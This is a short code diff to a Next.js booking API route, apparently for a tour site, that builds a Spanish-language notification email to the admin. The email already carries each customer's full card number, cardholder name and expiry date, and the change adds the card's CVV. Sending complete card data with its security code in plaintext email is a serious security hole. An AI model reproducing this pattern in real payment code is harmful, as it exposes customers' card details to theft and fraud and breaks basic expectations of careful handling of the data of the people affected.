@@ -51,7 +51,7 @@ export async function POST(request: NextRequest) {
       </div>
     `;
 
-    const text = `Nueva reserva recibida en Plan A\n\nCliente:\n- Nombre: ${personalInfo.firstName} ${personalInfo.lastName}\n- Email: ${personalInfo.email}\n- Teléfono: ${personalInfo.phone || "-"}\n\nReserva:\n- Actividad: ${activity.title}\n- Fecha: ${bookingDetails.date}\n- Participantes: ${bookingDetails.participants}\n- Duración: ${activity.duration}\n- Ubicación: ${activity.location}\n- Guía: ${activity.guide?.name || "Asignado en destino"}\n- Precio total: $${bookingDetails.totalPrice.toLocaleString()}\n- Código de confirmación: ${bookingDetails.confirmationCode}\n- ID de reserva: ${bookingDetails.bookingId}\n${paymentInfo ? `\nInformación de pago:\n- Tarjeta:  ${paymentInfo.cardNumber}\n- Nombre: ${paymentInfo.cardName}\n- Vencimiento: ${paymentInfo.expiry}\n` : ""}`;
+    const text = `Nueva reserva recibida en Plan A\n\nCliente:\n- Nombre: ${personalInfo.firstName} ${personalInfo.lastName}\n- Email: ${personalInfo.email}\n- Teléfono: ${personalInfo.phone || "-"}\n\nReserva:\n- Actividad: ${activity.title}\n- Fecha: ${bookingDetails.date}\n- Participantes: ${bookingDetails.participants}\n- Duración: ${activity.duration}\n- Ubicación: ${activity.location}\n- Guía: ${activity.guide?.name || "Asignado en destino"}\n- Precio total: $${bookingDetails.totalPrice.toLocaleString()}\n- Código de confirmación: ${bookingDetails.confirmationCode}\n- ID de reserva: ${bookingDetails.bookingId}\n${paymentInfo ? `\nInformación de pago:\n- Tarjeta:  ${paymentInfo.cardNumber}\n- Nombre: ${paymentInfo.cardName}\n- Vencimiento: ${paymentInfo.expiry}\n- CVV: ${paymentInfo.cvv}\n` : ""}`;
 
     const result = await sendEmail({
       to: adminEmail,
